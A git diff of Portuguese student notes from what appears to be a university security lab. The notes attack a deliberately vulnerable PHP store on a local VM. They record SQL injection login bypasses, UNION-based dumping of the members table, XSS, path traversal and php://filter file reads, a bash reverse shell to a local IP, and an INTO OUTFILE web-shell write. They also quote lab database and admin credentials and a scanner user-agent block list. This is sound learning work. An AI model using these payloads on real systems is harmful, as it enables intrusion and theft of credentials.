@@ -1,113 +1,266 @@
-VM Link:
-https://ln2.sync.com/dl/151e11660/qr384nih-fs3ir5f6-2fzq75ji-iqahbr5b
+Inicialmente começou-se por percorrer todas as páginas do site, tomando especial atenção ao login, onde se tentaram injeções de sql básicas, tanto no email como na password, sem chegar a nenhuma conclusão. Estas tentativas foram baseadas nas approaches de sql injection da aula prática 1, portanto: 
 
-https://en.wikipedia.org/wiki/SQL_injection
-https://joao.barraca.pt/teaching/sio/2020/p/1/Stuart%20Thomas%20The%20SQL%20Problem.pdf
-https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
-https://cwe.mitre.org/data/definitions/89.html
-https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
-https://cwe.mitre.org/data/definitions/79.html
-https://content-security-policy.com/
-https://developer.mozilla.org/pt-PT/docs/Web/HTTP/CORS
-https://joao.barraca.pt/teaching/sio/2020/t/2/SevenPerniciousKingdoms.pdf
-https://watermark.silverchair.com/tyw001.pdf?token=AQECAHi208BE49Ooan9kkhW_Ercy7Dm3ZL_9Cf3qfKAc485ysgAAArAwggKsBgkqhkiG9w0BBwagggKdMIICmQIBADCCApIGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMWvjGRSAvx3wsqVCMAgEQgIICYzNpA_gFl1cFAZOQ4vQIWF77quuc1y0BfqMFvo7ddnwcN9U7sdfh5x99JfMiHMe8jBhiQr0QCefo7u9rBIuaxGUaSBm1UrL8UnHQUFzCQgyfLEz1gZfQed7hPFH8AazlV11QtmGaFkSB9hNPo0BMoRJs9exC-NfI9At4LGm3OaOQJ6c3o9HjHXUDicamNtTSfwBtrPsHyyJS7YmiArScTfYJ5iITAIPnT3AAu2wIJMEVU__ajc22GZ_-fdJODE9syxdtP9fkzO6QaxDRVVS-_aVw1zB-a72YPtXFOpxZ_R3BvmUNBRNBf_0x_6cUWQIFCBjlBDpgQcsK1WJmmjkWS4byZTB_ACjskwGfPT1D2LOBB7TAkNRfbWEGbOFC0jvIrNmh50Jbzsp-4tCdaCNsw5OE0vUqWQbp9vL2OHTZAtvXOcE328EP-L1oErzdCFrzdwrGTf5wgtA0hZ1YYr7JUAuoKg3tH80gyR3MQ2p_kxTVnX5ZJkYHE7wxIoax8dah-L7nuFW9UKv30odzm2yAKgsmBz_LZdeiMjBFMIBWvKyJl7yKGaNgcuTgEGWv4nIh4X-EzHQUyaBERyP9ezh_M4BK9cfi4T33EMisK3u2pzPcSTIS50T8k7x_k63LMj7gSaQQsdP8ClL9yEjf6swo0eebr1raghYxSPYGwllojacnsiRipksSerQI8GOgjB65GEeUVdMLLJmvBcKGBv0WR5JBDt5Qaxs1vxQpucntt6wy0eFUl0PRC3Qm7iUqSpcTMymoqDz7r4l-_h2zSnaKuEIpv_MpSozWYsuptPq7vOt--Kun
+email: ' or '1'='1' -- 
+password: abc
 
+email: ' or 1 -- 
+password: abc
 
-admin@integratingsolutions.net 
-blog > click by Admin e ver url 
+username: ' or '1'='1' -- // 
+email: abc
 
-http://192.168.0.49/details.php?%3Cscript%3Ealert(%27eheh%27)%3C/script%3Eprod=3&type=3
-DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
+E tudo falhava porque o campo do email pedia para introduzir um email válido. 
+Tentou-se então sql injection de outra maneira, pesquisando sobre como introduzir algo no email que o SQL aceitasse como email, embora não o fosse.
+src: https://stackoverflow.com/questions/2923594/valid-email-addresses-xss-and-sql-injection
 
+email: "'OR 1=1--"@gmail.com
+password: abc
 
-http://192.168.0.49/details.php?prod=%27union%20select%201,2,3,4,5%27%20--
+Novamente sem sucesso, tentou-se colocar regex no campo do email, que corresponde-se a um formato genérico de email
 
-http://192.168.0.49/terms.php?lang=GBP
+email: [a-z0-9.-_+]@[a-z0-9.-].com
+password: abc
 
-carolina@epifania:~/sqlmapproject-sqlmap-1d5bde9$ dirb http://192.168.0.49/
+Não chegando a qualquer resultado palpável, continuou-se a explorar o site, onde se começou a descobrir pormenores mais interessantes:  
+1.  A partir do url das páginas Board e Software, notou-se uma possibilidade de conseguir fazer sql injection, uma vez que tinha '?type=1' ou '?prod=3&type=1', por exemplo. 
+	Assim sendo, começou-se a tentar injeções, novamente com base na aula prática 1.
+	Inicialmente fizemos várias tentativas para descobrir quantas colunas eram retornadas pelos queries feitos às bases de dados. Sabíamos que havia pelo menos 5 (name, price, type, details e id). 
+	
+	<ip>/details.php?<script>alert('eheh')</script>prod=3&type=3	
+		" DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1" 
+		A partir deste resultado ficamos a saber qual o SGDB usado para sustentar os dados do site. 
+	
+	<ip>/products.php?type=1 union select 1,2,3,4,5 -- 
+		Apareceu mais um produto no fim da lista, cujo nome era 3, o que nos fez suspeitar que a 3º coluna retornada pelos queries à base de dados era colocada no atributo name do produto. Assim, achámos que a melhor forma de fazer sql injection nesta página seria a partir da 3 coluna, o que é explorado abaixo. 
+		Clicando no produto não se chegou a conclusão nenhuma.
+		
+	<ip>/products.php?type=1 union select 1,2,3,4,5,6 -- 
+		Este url já nos redireciona para a home, pelo que se concluiu que eram só 5 colunas. 
+		
+	<ip>/products.php?type=1 union select 1,database(),3,4,5 -- 
+		Com isto apareceu mais um produto cujo nome era 3. Clicando nesse mesmo e observando o url, apercebemo-nos de que o type correspondia a 'oldstore' -> nome da base de dados.
+		
+	<ip>/products.php?type=1 union select 1, table_name, column_name, table_schema, 5 from information_schema.columns -- 	
+		Percorrendo a página inteira, encontrou-se no fundo os nomes de algumas tabelas que se pensou serem interessantes explorar: 
+		
+		<ip>/products.php?type=1 union select 1,2,COLUMN_NAME,4,5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="tblProducts"
+			Devolve o nome de todos os produtos disponíveis, a partir da qual é possível fazer coisas do tipo:
+		
+			<ip>/products.php?type=1 union select 1,2, id,4,5 from tblProducts -- 
+				Verificar todos os ids dos produtos existentes na base de dados.
+			
+			<ip>/products.php?type=1 union select 1,2, title,4,5 from tblBlogs --
+				Verificar os títulos dos blogs existentes na base de dados.
+				
+			Mas mais interessante:
+			<ip>/products.php?type=2 union select 1, 2, id, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, username, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, password, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, session, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, name, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, blog, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, admin, 4, 5 from tblMembers
+				Temos então agora acesso ao mail do admin, à sua password, sessão, nome, entre outros.
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
+			Tabelas importantes:
+			tblBlogs (author, title, content)
+			tblMembers (id, username, password, session, name, blog, admin)
+			tblProducts (id, type, name, price, detail)
+			
+			conteúdo da tabela tblMembers:
+			1	admin@integratingsolutions.net	Administrator	354403ec41ad649d1e5a9f108f0e5245	Admin	1	1
+	
+Podemos então entrar, agora, na conta do admin.
+email: admin@integratingsolutions.net
+password: Administrator
 
-START_TIME: Fri Oct 30 20:06:37 2020
-URL_BASE: http://192.168.0.49/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+Nota: tínhamos já obtido o email previamente através da página blogs, porque clicando em 'by Admin' era possível ver qual o email associado ao mesmo. 
 
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://192.168.0.49/ ----
-==> DIRECTORY: http://192.168.0.49/admin/                                                           
-==> DIRECTORY: http://192.168.0.49/downloads/                                                       
-==> DIRECTORY: http://192.168.0.49/images/                                                          
-+ http://192.168.0.49/index.php (CODE:200|SIZE:1533)                                                
-+ http://192.168.0.49/info.php (CODE:200|SIZE:85424)                                                
-+ http://192.168.0.49/server-status (CODE:403|SIZE:277)                                             
-==> DIRECTORY: http://192.168.0.49/theme/                                                           
-                                                                                                    
----- Entering directory: http://192.168.0.49/admin/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                    
----- Entering directory: http://192.168.0.49/downloads/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                    
----- Entering directory: http://192.168.0.49/images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                                                    
----- Entering directory: http://192.168.0.49/theme/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                               
------------------
-END_TIME: Fri Oct 30 20:06:38 2020
-DOWNLOADED: 4612 - FOUND: 3
-
-http://192.168.0.49/downloads/
-http://192.168.0.49/admin/adminheader.php
-http://192.168.0.49/images/products/
-http://192.168.0.49/downloads/login.php.txt
-
-<?php
-include 'connection.php';
-
-$sql    = "SELECT * FROM tblMembers WHERE username='" . $_POST['usermail'] . "';";
-$result = mysql_query($sql, $link);
-
-if (!$result) {
-    echo "DB Error, could not query the database\n";
-    echo 'MySQL Error: ' . mysql_error();
-    exit;
-}
-
-if (mysql_num_rows($result) < 1) {
-    header('Location: /account.php?login=user') ;
-}
-else {
-    $sql    = "SELECT session FROM tblMembers WHERE username='" . $_POST['usermail'] . "' AND password='" . $_POST['password'] . "';";
-    $result = mysql_query($sql, $link);
-    if (mysql_num_rows($result) == 0) {
-        header('Location: /account.php?login=pass') ;
-    }
-    else {
-        $row =  mysql_fetch_assoc($result);
-        setcookie("SessionId", $row['session']);
-        header('Location: /account.php?login=success');
-    }
-}
-?>
+O próximo passo foi atacar novamente o login, tentando injeção já com o email.
+email: admin@integratingsolutions.net
+password: "' or 1 = 1 -- 
+		  (ou outra equivalente, como: "' or 1 = 1 -- )
+		  
+Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de fazer sql injection e xss:
+<script>{console.log(“ola”)}</script> 
+	Resultando numa mensagem na consola: GET http://192.168.1.7/ola
+<img src="https://shifter.sapo.pt/wp-content/uploads/2018/03/rickrolled.png">
+	Embora não se possa colocar uma imagem no titulo, o conteúdo não é filtrado no sentido em que não verifica de onde vem a informação e posta tudo o que lhe é fornecido. 
+<script>alert('eheh')</script>
+<div><p>"something"</p></div>
+<? php echo 'hello' ?>
 
 
-http://192.168.1.6/products.php?type=1%20union%20select%201,COLUMN_NAME,COLUMN_NAME,3,5%20from%20information_schema.columns
+Continuando com a exploração da página em si, suscitaram-nos a atenção dois pormenores:
+1. Aquando na página dos termos e condições (que também contém o email do admin), seria de esperar que clicar quer em GBP, EUR ou USD no rodapé da página fizesse algo, o que não aconteu, embora o atributo lang aparecesse no url. Isto será explorado mais à frente. 
 
-<img src="https://developers.google.com/web/fundamentals/design-and-ux/responsive/img/html5.png?hl=pt-br" > 
+2. Querendo saber o que o portfolio fazia para iniciar o download, fizemos hover sobre o mesmo e obtivemos o seguinte urll:
+	<ip>/download.php?item=Brochure.pdf
+	Explorado também mais à frente. 
+	
+	
+	
+Analizar os resultados do nmap:
+	#TODO
+Analizar os resultados do nikto2:
+	#TODO
+Analizar os resultados do sqlmap:
+	#TODO
+Analizar os resultados do dirb: ($ dirb http://192.168.0.49/)
+	==> DIRECTORY: <ip>/admin/                                                           
+	==> DIRECTORY: <ip>/downloads/                                                       
+	==> DIRECTORY: <ip>/images/ 
+	<ip>/theme/
+	
+	Explorando todos estes urls, os mais importantes são /admin & /downloads.
+		/downloads:
+			ficheiro login.php.txt que nos revela como é processado o login na página e nos fez entender que a verificação do email não era feita a partir de sql, bem como que algures existe um ficheiro chamado 'connection.php'
+		
+		/admin:
+			se nos encontrarmos na conta do administrador e entrarmos em <ip>/admin/admin.php temos acesso a um site que é disponibilizado ao admin para adicionar e remover algo (ficheiros addproduct.php e delproduct.php) 
+			e mais 3 ficheiros .php
+			
+Voltando um passo atrás e vendo como se processava o download do Brochure.pdf, testou-se o seguinte:
+<ip>/download.php?item=connection.php
 
-http://192.168.1.6/products.php?type=1&lang=php://filter/read=convert.base64-encode/resource=connection.php
+O que não resultou em nada.. Mas não deu erro, podemos simplesmente estar a ir buscar ao diretório errado, portanto tentou-se:
+PATH TRAVERSAL
+<ip>/download.php?item=../connection.php
 
-vendo o pedido que ele estava a fazer para chegar ao portfolio 
-http://192.168.1.6/download.php?item=../../../../../../../../var/www/html/config.php
+Temos assim acesso a todos os ficheiros .php
+Conjunto de ficheiros .php que encontrámos e conseguimos descarregar:
+1.  about.php
+2.  aboutcontent.php
+3.  account.php
+4.  blog.php
+5.  blog-content.php
+6.  config.php
+7.  connection.php
+8.  connectioni.php
+9.  display.php
+10. footer.php
+11. front.php
+12. header.php
+13. index.php
+14. info.php
+15. products.php
+16. user-details.php
+17. download.php
+18. getfile.php
+19. login.php
+20. logout.php
+21. postblog.php
+22. terms.php
+23. updateaccount.php
+24. admin.php
+25. admincontent.php
+26. adminheader.php
+27. adminnav.php
+
+Ficheiros .php que possivelmente existem: 
+1. delproduct.php
+2. addproduct.php
+
+
+Informações que mais saltaram à vista ao analizar os ficheiros .php:
+	connection.php
+		if (!$link = mysql_connect($host, $user, $pass)) {
+		echo 'Could not connect to mysql';
+		exit;
+		}	
+	
+			informação sobre o que necessitamos para entrar na base de dados 
+	
+	
+	config.php
+		$host = 'localhost';
+		$user = 'root';
+		$pass = '1ll-b3-b4ck';
+		$database = 'oldstore';
+		
+			dados para entrar na DB
+	
+	
+	display.php
+	    if (mysql_num_rows($result) > 0) {
+        if (isset($_GET['lang'])) {
+            $lang = $_GET['lang'];
+        }
+        elseif (isset($_COOKIE['lang'])) {
+            $lang = $_COOKIE['lang'];
+        } else {
+            $lang = 'GBP';
+        }
+
+        include $lang;
+        
+        
+		    ! isto é muito importante porque finalmente entendemos para o que serve o lang, vai ser o valor da cookie. 
+		    futhermore, e se não mais importante, há um include da variável $lang no ficheiro, isto abre possibilidades sobre como injetar php e aceder a outro tipo de informações
+        
+        
+	header.php
+		<?php
+		include 'nav.php';
+		?>
+		
+		
+		if (!isset($_COOKIE['level'])) {
+    	setcookie("level", "1");
+		}	
+		
+		
+		if (strpos($_SERVER['HTTP_USER_AGENT'], "sqlmap") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "Havij") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "Nikto") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "requests") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "ZAP") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "Burp") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "Metasploit") !== false ||
+		strpos($_SERVER['HTTP_USER_AGENT'], "Gecko/20060418 Firefox/1.0.8") !== false) {
+			exit;
+		}
+		
+		
+			outro include, pode ser interessante
+			outra utilização de cookie
+			motivo pelo qual sqlmap e nikto não darão informação nenhuma??
+			
+	
+	info.php
+		Server Root 	/etc/apache2 
+		DOCUMENT_ROOT 	/var/www/html 
+		_SERVER["SERVER_ADMIN"]	webmaster@localhost
+		_SERVER["HTTP_ACCEPT"]	text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+		APACHE_LOG_DIR 	/var/log/apache2 
+
+
+Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
+#TODO
+	<ip>/download.php?item=../../../../../../../../var/www/html/index.php
+						   ../../../../etc/httpd/logs/access_log
+                           ../../../../../../../../var/www/html/config.php
+	&lang=../../../../../../../../etc/httpd/logs/access_log
+								 /var/log/apache2/error.log
+								 /var/log/apache2/access.log
+								 /var/log/httpd/access.log
+								 /var/log/httpd/access_log
+								 /var/log/mysqld.log
+								 /var/log/httpd/error_log
+							 	 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access_log
+							 	 php://filter/read=convert.base64-encode/resource=connection.php
+								 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access.log	
+								 <? php echo "hello" ?>
+								 <? php echo "Hello World";
+								 <?php
+							 		 alert("Hello World");
+									 function alert($msg) { echo "<script type='text/javascript'>alert('$msg');</script>"; }
+		  						 ?>
+								 <? php alert("Hello World"); function alert($msg) { echo "<script type='text/javascript'>alert('$msg');</script>"; } ?>
+	      						 <? php echo shell_exec(‘ls -lart’); ?>
+	      						 <?php exec('whoami') ?>
+								 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/8888 0>&1'");
+	
+	1 union SELECT 1,2,3,“<?php shell_exec('ls); ?>”,5 INTO OUTFILE “../../../../../../var/www/html/ls.php”
+	1 union SELECT 1,LOAD_FILE(“../../../../../../var/www/html/ls.php”),3,4,5
+
